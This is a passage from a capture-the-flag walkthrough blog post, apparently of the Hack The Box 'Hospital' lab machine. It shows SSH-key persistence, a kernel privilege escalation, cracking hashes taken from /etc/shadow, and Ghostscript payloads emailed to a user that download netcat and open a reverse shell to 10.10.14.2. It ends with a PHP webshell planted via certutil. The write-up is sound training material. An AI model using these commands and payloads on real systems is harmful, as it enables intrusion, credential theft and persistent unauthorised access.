</code></pre></div></div> <p>Trying the command encoded in base-64 and url-encoding also fails. This indicates the problem is likely with the websehll itself.</p> <p>Trying a new shell from <a href="https://github.com/flozz/p0wny-shell/tree/master" rel="external nofollow noopener" target="_blank">flozz</a> is successful and a working webshell is obtained.</p> <p><img src="/assets/img/2024-hospital/webshell-success.png" alt="webshell-success.png" class="auto-resize"></p> <p>Forwarding it back to the terminal is also successful.</p> <p><img src="/assets/img/2024-hospital/forward-webshell.png" alt="forward-webshell.png" class="auto-resize"></p> <p>To stabilise the shell we can use the following command combination.</p> <p><img src="/assets/img/2024-hospital/stabilise-shell.png" alt="stabilise-shell.png" class="auto-resize"></p> <ul> <li> <strong><code class="language-plaintext highlighter-rouge">python3 -c 'import pty;pty.spawn("/bin/bash")'</code></strong>: <ul> <li>Launches a new Bash shell within a pseudo-terminal (PTY) session.</li> <li>Improves interaction with the shell (e.g., supports auto-completion, history).</li> <li>Makes the shell behave more like a local terminal.</li> </ul> </li> <li> <strong><code class="language-plaintext highlighter-rouge">export TERM=xterm</code></strong>: <ul> <li>Sets the terminal type to <code class="language-plaintext highlighter-rouge">xterm</code>, which is widely compatible and supports advanced features.</li> <li>Ensures that the terminal emulation behaves consistently.</li> <li>Enables colour support, cursor movement, and screen clearing commands.</li> </ul> </li> <li> <strong><code class="language-plaintext highlighter-rouge">stty raw -echo</code></strong>: <ul> <li>Sets the terminal to raw mode, sending characters directly without processing.</li> <li>Disables local echo, preventing typed characters from being displayed twice.</li> <li>Ensures that input and output are sent and received as intended, without automatic newline handling or echoing.</li> </ul> </li> <li> <strong><code class="language-plaintext highlighter-rouge">fg</code></strong>: <ul> <li>Brings the most recent background job (your shell) to the foreground.</li> <li>Necessary if the shell was backgrounded, especially after changing terminal settings.</li> <li>May require hitting Enter to see the prompt after execution.</li> </ul> </li> </ul> <p>After the last step hit return a few times to return the prompt.</p> <p>Looking in the <code class="language-plaintext highlighter-rouge">/uploads</code> file, there are no files, so regaining a shell may be difficult.</p> <h1 id="establishing-persistence-1">Establishing Persistence</h1> <p>To avoid having to re-do the initial steps in the event of a disconnected shell, malicious SSH keys can be placed on the target.</p> <p>First, the <code class="language-plaintext highlighter-rouge">~/.ssh</code> directory is created, and appropriate write permissions confirmed..</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/var/www/html<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> ~/.ssh
<span class="nb">ls</span>: cannot access <span class="s1">'/var/www/.ssh'</span>: No such file or directory
www-data@webserver:/var/www/html<span class="nv">$ </span><span class="nb">mkdir</span> ~/.ssh
www-data@webserver:/var/www/html<span class="nv">$ </span><span class="nb">touch</span> ~/.ssh/test <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"write access confirmed"</span> <span class="o">||</span> <span class="nb">echo</span> <span class="s2">"no write access"</span>
write access confirmed
www-data@webserver:/var/www/html<span class="nv">$ </span><span class="nb">rm</span> ~/.ssh/test

</code></pre></div></div> <p>Then an SSH key pair is generated on the local machine.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb-machines/hospital/persistence]
└─<span class="nv">$ </span>ssh-keygen <span class="nt">-t</span> rsa <span class="nt">-b</span> 2048 <span class="nt">-f</span> ctf_key
</code></pre></div></div> <ul> <li> <code class="language-plaintext highlighter-rouge">-t rsa</code>: Specifies the type of key to create, in this case, RSA.</li> <li> <code class="language-plaintext highlighter-rouge">-b 2048</code>: Specifies the number of bits in the key, in this case, 2048 bits.</li> <li> <code class="language-plaintext highlighter-rouge">-f ~/.ssh/ctf_key</code>: Specifies the filename of the key; replace <code class="language-plaintext highlighter-rouge">ctf_key</code> with a name that makes sense for your situation.</li> </ul> <p>The public key is then displayed.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb-machines/hospital/persistence]
└─<span class="nv">$ </span><span class="nb">cat </span>ctf_key.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDqtM5AlnUbVyg+iWvhLSn96sRU5Epi8/8T&lt;SNIP&gt;
</code></pre></div></div> <p>On the target system , the malicious public key is appended to the <code class="language-plaintext highlighter-rouge">~/.ssh/authorized_keys</code> file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/var/www/html<span class="nv">$ </span>nano ~/.ssh/authorized_keys
www-data@webserver:/var/www/html<span class="nv">$ </span><span class="nb">cat</span> ~/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDqtM5AlnUbVyg+iWvhLSn&lt;SNIP&gt;
www-data@webserver:/var/www/html<span class="err">$</span>
</code></pre></div></div> <p>Now if the shell is dropped, it may be possible to easily regain access using SSH</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb-machines/hospital/persistence]
└─<span class="nv">$ </span>ssh <span class="nt">-i</span> ~/Documents/htb-machines/hospital/persistence/ctf_key www-data@hospital.htb
</code></pre></div></div> <h1 id="system-enumeration">System enumeration</h1> <p>Checking sudo permissions for the <code class="language-plaintext highlighter-rouge">www-data</code> account requires a password.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/var/www/html<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>www-data:
</code></pre></div></div> <p>However, a review of the Linux kernel version reveals an unpatched vulnerbaility.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/var/www/html<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
Linux webserver 5.19.0-35-generic <span class="c">#36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span>
</code></pre></div></div> <h1 id="privilege-escalation">Privilege escalation</h1> <p>Searching the linux kernel version reveals a potential privilege escalation vulnerability as described <a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629" rel="external nofollow noopener" target="_blank">here</a></p> <p>The vulnerability is easily exploited by downloading the exploit, serving it and retrieving it on the target machine.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/htb-machines/hospital/exploits/CVE-2023-2640-CVE-2023-32629]
└─<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...

10.129.229.189 - - <span class="o">[</span>07/Apr/2024 21:54:22] <span class="s2">"GET /exploit.sh HTTP/1.1"</span> 200 -
</code></pre></div></div> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/var/www/html<span class="nv">$ </span>wget 10.10.14.2:80/exploit.sh
<span class="nt">--2024-04-08</span> 08:54:18--  http://10.10.14.2/exploit.sh
Connecting to 10.10.14.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 558 <span class="o">[</span>text/x-sh]
Saving to: ‘exploit.sh’

exploit.sh          100%[<span class="o">===================&gt;]</span>     558  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s

2024-04-08 08:54:19 <span class="o">(</span>95.0 MB/s<span class="o">)</span> - ‘exploit.sh’ saved <span class="o">[</span>558/558]

www-data@webserver:/var/www/html<span class="err">$</span>
</code></pre></div></div> <p>Running the exploit, returns a root shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/var/www/html<span class="nv">$ </span>bash exploit.sh
<span class="o">[</span>+] You should be root now
<span class="o">[</span>+] Type <span class="s1">'exit'</span> to finish and leave the house cleaned
root@webserver:/var/www/html#

</code></pre></div></div> <blockquote> <p><strong><em>Now would be a good time to create persistence with the root user.</em></strong></p> </blockquote> <h1 id="lateral-movement">Lateral movement</h1> <h2 id="stealing-and-cracking-hashes">Stealing and cracking hashes</h2> <p>Looking at <code class="language-plaintext highlighter-rouge">/etc/shadow</code>, there is a hash for the <code class="language-plaintext highlighter-rouge">root</code> and <code class="language-plaintext highlighter-rouge">drwilliams</code> accounts.</p> <p><img src="/assets/img/2024-hospital/hashes-found.png" alt="hashes-found.png" class="auto-resize"></p> <p>Stealing the hashes and running them through Hashcat cracks the <code class="language-plaintext highlighter-rouge">drwilliams</code> one.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb-machines/hospital/credentials]
└─<span class="nv">$ </span>hashcat hashes /usr/share/wordlists/rockyou.txt
hashcat <span class="o">(</span>v6.2.6<span class="o">)</span> starting <span class="k">in </span>autodetect mode
<span class="nv">$6$uWBSeTcoXXT</span>&lt;SNIP&gt;

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 <span class="o">(</span>sha512crypt <span class="nv">$6$,</span> SHA512 <span class="o">(</span>Unix<span class="o">))</span>
Hash.Target......: <span class="nv">$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w</span>/iItu5.Ohoz...W192y/
Time.Started.....: Sun Apr  7 22:04:47 2024 <span class="o">(</span>1 min, 3 secs<span class="o">)</span>
Time.Estimated...: Sun Apr  7 22:05:50 2024 <span class="o">(</span>0 secs<span class="o">)</span>
Kernel.Feature...: Pure Kernel
Guess.Base.......: File <span class="o">(</span>/usr/share/wordlists/rockyou.txt<span class="o">)</span>
Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
Speed.#1.........:     3366 H/s <span class="o">(</span>3.58ms<span class="o">)</span> @ Accel:1024 Loops:64 Thr:1 Vec:4
Recovered........: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>total<span class="o">)</span>, 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>new<span class="o">)</span>
Progress.........: 215040/14344385 <span class="o">(</span>1.50%<span class="o">)</span>
Rejected.........: 0/215040 <span class="o">(</span>0.00%<span class="o">)</span>
Restore.Point....: 214016/14344385 <span class="o">(</span>1.49%<span class="o">)</span>
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
Candidate.Engine.: Device Generator
Candidates.#1....: raycharles -&gt; pakimo
Hardware.Mon.#1..: Util: 93%

Started: Sun Apr  7 22:04:28 2024
Stopped: Sun Apr  7 22:05:52 2024
</code></pre></div></div> <h2 id="business-email-compromise-1">Business email compromise</h2> <p>Now with Dr. William’s credentials, other services can be explored revealed in the initial scan, such as a webmail service running on Port 443.</p> <p><img src="/assets/img/2024-hospital/webservice.png" alt="webservice.png" class="auto-resize"></p> <p>Trying Dr. Williams’ credentials is successful and access is obtained to the email account.</p> <p>An email in the inbox hints at another potential vector.</p> <p><img src="/assets/img/2024-hospital/email.png" alt="email.png" class="auto-resize"></p> <h2 id="windows-movement">Windows movement</h2> <p>A google for <code class="language-plaintext highlighter-rouge">GhostScript</code> and <code class="language-plaintext highlighter-rouge">.eps</code> reveals another potential vector in the form of a remote code execution via a command injection.</p> <ul> <li><a href="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection" rel="external nofollow noopener" target="_blank">jakabakos/CVE-2023-36664-Ghostscript-command-injection: Ghostscript command injection vulnerability PoC (CVE-2023-36664) (github.com)</a></li> </ul> <p>It seems the vector is to create a payload that exploited the vulnerability in the GhostScript software, and send it back to Dr. Brown to move over to that user’s machine..</p> <p>The payload is crafted by creating a malicious <code class="language-plaintext highlighter-rouge">.eps</code> file and appending a command to it. This appears to be a method that will break out into the Windows layer, as presumably Dr. Brown will read the email and open the file on a Windows machine.</p> <p>Proceeding with this theory, the Windows version of Netcat (<code class="language-plaintext highlighter-rouge">nc64.exe</code>) is required, and palced in the same directory as the exploit. A payload is created that retrieves the <code class="language-plaintext highlighter-rouge">nc64.exe</code> from a webserver</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/htb-machines/hospital/exploits/CVE-2023-36664-Ghostscript-command-injection]
└─<span class="nv">$ </span>python3 CVE_2023_36664_exploit.py <span class="nt">--inject</span> <span class="nt">--payload</span> <span class="s2">"curl 10.10.14.2:8000/nc64.exe -o nc.exe"</span> <span class="nt">--filename</span> new-design.eps
<span class="o">[</span>+] Payload successfully injected into new-design.eps.
</code></pre></div></div> <p>The binary is then served and the malicious file sent back to Dr. Brown.</p> <p><img src="/assets/img/2024-hospital/Send-netcat.png" alt="Send-netcat.png" class="auto-resize"></p> <p>A few moments later, the <code class="language-plaintext highlighter-rouge">nc64.exe</code> binary was successfully retrieved from the server, indicating Dr. Brown has opened the malicious <code class="language-plaintext highlighter-rouge">.eps</code> file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/htb-machines/hospital/exploits/CVE-2023-36664-Ghostscript-command-injection]
└─<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 8000
Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
10.129.229.189 - - <span class="o">[</span>07/Apr/2024 22:36:03] <span class="s2">"GET /nc64.exe HTTP/1.1"</span> 200 -
</code></pre></div></div> <p>A second payload is now crafted that will make use of the <code class="language-plaintext highlighter-rouge">nc64.exe</code> binary, and establish a reverse shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/htb-machines/hospital/exploits/CVE-2023-36664-Ghostscript-command-injection]
└─<span class="nv">$ </span>python3 CVE_2023_36664_exploit.py <span class="nt">--inject</span> <span class="nt">--payload</span> <span class="s2">"nc.exe 10.10.14.2 1234 -e cmd.exe"</span> <span class="nt">--filename</span> file.eps
<span class="o">[</span>+] Payload successfully injected into file.eps.
</code></pre></div></div> <p>The second payload is sent via email as well.</p> <p><img src="/assets/img/2024-hospital/email-payload.png" alt="email-payload.png" class="auto-resize"></p> <p>Then, a reverse shell is successfully caught, providing access to Dr. Brown’s Windows machine.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/htb-machines/hospital/exploits/CVE-2023-36664-Ghostscript-command-injection]
└─<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 1234
listening on <span class="o">[</span>any] 1234 ...
connect to <span class="o">[</span>10.10.14.2] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.229.189] 25203
Microsoft Windows <span class="o">[</span>Version 10.0.17763.4974]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;whoami
<span class="nb">whoami
</span>hospital<span class="se">\d</span>rbrown

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 7357-966F

 Directory of C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments

04/08/2024  05:28 AM    &lt;DIR&gt;          <span class="nb">.</span>
04/08/2024  05:28 AM    &lt;DIR&gt;          ..
10/23/2023  03:33 PM               373 ghostscript.bat
04/08/2024  05:28 AM            45,272 nc.exe
               2 File<span class="o">(</span>s<span class="o">)</span>         45,645 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>   4,082,790,400 bytes free

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;

</code></pre></div></div> <p>The user flag is found.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL&gt;cd Desktop
<span class="nb">cd </span>Desktop

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 7357-966F

 Directory of C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop

10/27/2023  12:24 AM    &lt;DIR&gt;          <span class="nb">.</span>
10/27/2023  12:24 AM    &lt;DIR&gt;          ..
04/08/2024  05:18 AM                34 user.txt
               1 File<span class="o">(</span>s<span class="o">)</span>             34 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>   4,082,765,824 bytes free

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop&gt;cat user.txt
<span class="nb">cat </span>user.txt
<span class="s1">'cat'</span> is not recognized as an internal or external <span class="nb">command</span>,
operable program or batch file.

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop&gt;type user.txt
<span class="nb">type </span>user.txt
&lt;REDACTED&gt;

</code></pre></div></div> <h2 id="privilege-escalation---windows">Privilege escalation - Windows</h2> <p>On Dr Brown’s machine is a bat file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 7357-966F

 Directory of C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments

04/08/2024  05:28 AM    &lt;DIR&gt;          <span class="nb">.</span>
04/08/2024  05:28 AM    &lt;DIR&gt;          ..
10/23/2023  03:33 PM               373 ghostscript.bat
04/08/2024  05:28 AM            45,272 nc.exe
               2 File<span class="o">(</span>s<span class="o">)</span>         45,645 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>   4,082,753,536 bytes free

</code></pre></div></div> <p>Reviewing the file reveals a hardcoded password.</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Users\drbrown.HOSPITAL\Documents</span><span class="err">&gt;</span><span class="nx">type</span><span class="w"> </span><span class="nx">ghostscript.bat</span><span class="w">
</span><span class="kr">type</span><span class="w"> </span><span class="n">ghostscript.bat</span><span class="w">
</span><span class="err">@</span><span class="nx">echo</span><span class="w"> </span><span class="nx">off</span><span class="w">
</span><span class="n">set</span><span class="w"> </span><span class="nx">filename</span><span class="o">=%</span><span class="n">~1</span><span class="w">
</span><span class="nx">powershell</span><span class="w"> </span><span class="nt">-command</span><span class="w"> </span><span class="s2">"</span><span class="nv">$p</span><span class="s2"> = convertto-securestring '&lt;REDACTED&gt;' -asplain -force;</span><span class="nv">$c</span><span class="s2"> = new-object system.management.automation.pscredential('hospital\drbrown', </span><span class="nv">$p</span><span class="s2">);Invoke-Command -ComputerName dc -Credential </span><span class="nv">$c</span><span class="s2"> -ScriptBlock { cmd.exe /c "</span><span class="nx">C:\Program</span><span class="se">` </span><span class="nx">Files\gs\gs10.01.1\bin\gswin64c.exe</span><span class="s2">" -dNOSAFER "</span><span class="nx">C:\Users\drbrown.HOSPITAL\Downloads\</span><span class="o">%</span><span class="nx">filename</span><span class="o">%</span><span class="s2">" }"</span><span class="w">

</span></code></pre></div></div> <p>The password can be tried on potential other services; for instance, RPC.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Password for [WORKGROUP\drbrown]:
rpcclient $&gt;
</code></pre></div></div> <p><strong><em>A note on RPC</em></strong></p> <ul> <li>Remote Procedure Call (RPC) is a protocol that allows a program on one computer to execute a procedure (a subroutine or function) on another computer without needing to understand the network’s details. In essence, RPC abstracts the complexities of network communication, allowing developers to focus on the implementation of the function rather than the communication mechanism. This is particularly useful in distributed systems, where different parts of an application may reside on different networked computers.</li> <li>RPC operates on a client-server model. The client makes a request for a procedure to be executed on the server. The RPC system then takes care of packaging the procedure’s parameters, sending them over the network to the server, executing the requested procedure on the server with the supplied parameters, and then sending the result back to the client.</li> </ul> <p>Once the RPC shell is established, executing <code class="language-plaintext highlighter-rouge">querydispinfo</code> will return a description of the various users on the target machine.</p> <p><img src="/assets/img/2024-hospital/rpc.png" alt="rpc.png" class="auto-resize"></p> <p>This reveals the presence of a local administrator account.</p> <p>Enumerating the directory structure further reveals the presence of the <code class="language-plaintext highlighter-rouge">xampp\htdocs</code> folder.</p> <p><strong>* A note on <code class="language-plaintext highlighter-rouge">xampp\htdocs</code></strong>*</p> <ul> <li>The <code class="language-plaintext highlighter-rouge">xampp\htdocs</code> folder is a directory used by XAMPP, a popular open-source cross-platform web server solution stack package. XAMPP stands for Cross-Platform (X), Apache (A), MariaDB (M), PHP (P), and Perl (P). It is designed to be an easy-to-install Apache distribution containing MariaDB, PHP, and Perl, making it a convenient tool for developers to create and test web applications on their local machines before deploying them to a live server.*</li> <li>If found on a machine in a production environment or accessible over a network, it could be a security concern. XAMPP is not designed with security in mind for production use; its default configuration is meant for development purposes only, with minimal security settings. An improperly secured XAMPP installation accessible over a network can be exploited by malicious actors.</li> </ul> <p>The permissions on the location reveal any user can read and execute to the location, and <code class="language-plaintext highlighter-rouge">NT Authority</code> has full control.</p> <p>A malicious file uploaded to the location could theoretically be executed in the context of <code class="language-plaintext highlighter-rouge">NT Authority</code>.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt; Get-Acl | Format-List

Path   : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs
Owner  : BUILTIN<span class="se">\A</span>dministrators
Group  : HOSPITAL<span class="se">\D</span>omain Users
Access : NT AUTHORITY<span class="se">\L</span>OCAL SERVICE Allow  FullControl
         NT AUTHORITY<span class="se">\S</span>YSTEM Allow  FullControl
         BUILTIN<span class="se">\A</span>dministrators Allow  FullControl
         BUILTIN<span class="se">\U</span>sers Allow  ReadAndExecute, Synchronize
         BUILTIN<span class="se">\U</span>sers Allow  AppendData
         BUILTIN<span class="se">\U</span>sers Allow  CreateFiles
         CREATOR OWNER Allow  268435456
</code></pre></div></div> <p>The shell used earlier was re-used here. First it was served locally on the attack machine and then retrieved on the Windows target within the potentially vulnerable <code class="language-plaintext highlighter-rouge">htdocs</code> folder.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/htb-machines/hospital/exploits/p0wny-shell]
└─<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 8000
Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
</code></pre></div></div> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\xampp\htdocs</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">certutil</span><span class="w"> </span><span class="nt">-urlcache</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">http://10.10.14.2:8000/shell.php</span><span class="w"> </span><span class="nx">shell.php</span><span class="w">
</span></code></pre></div></div> <p>Browsing to the uploaded shell on the Windows machine successfully obtains another webshell in the context of the <code class="language-plaintext highlighter-rouge">NT Authority</code> user.</p> <p>The root flag is found.</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DC</span><span class="err">$@</span><span class="nx">DC:C:\xampp\htdocs</span><span class="c"># whoami</span><span class="w">
</span><span class="n">nt</span><span class="w"> </span><span class="nx">authority\system</span><span class="w">

</span><span class="n">DC</span><span class="err">$@</span><span class="nx">DC:C:\xampp\htdocs</span><span class="c"># type c:\Users\Administrator\Desktop\root.txt</span><span class="w">
</span><span class="err">&lt;</span><span class="n">REDACTED</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div></div> </div> </article> <br> <hr> <br> <ul class="list-disc pl-8"></ul> <h2 class="text-3xl font-semibold mb-4 mt-12">Enjoy Reading This Article?</h2> <p class="mb-2">Here are some more articles you might like to read next:</p> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/headleass-walkthrough/">Headless - XSS, Command Injection, and Sudo abuse.</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/bizness-walkthrough/">Bizness - Authentication bypass and SSRF.</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/iclean-walkthrough/">IClean - XSS, SSTI, and Sudo abuse.</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/devvortex-walkthrough/">Devvortex - Unauthenticated Information Disclosure and password re-use.</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/codify-walkthrough/">Codify - Arbitraty code execution and stealing hashes.</a> </li> </div> </div> </div> </div> <footer class="fixed-bottom"> <div class="container mt-0"> © Copyright 2024 . Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.8/dist/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?7b30caa5023af4af8408a472dc4e1ebb"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script defer src="https://unpkg.com/bootstrap-table@1.22.1/dist/bootstrap-table.min.js"></script> <script src="/assets/js/no_defer.js?d633890033921b33e0ceb13d22340a9c"></script> <script defer src="/assets/js/common.js?acdb9690d7641b2f8d40529018c71a01"></script> <script defer src="/assets/js/copy_code.js?c9d9dd48933de3831b3ee5ec9c209cac" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-JZNPNDMG9P"></script> <script>function gtag(){window.dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-JZNPNDMG9P");</script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>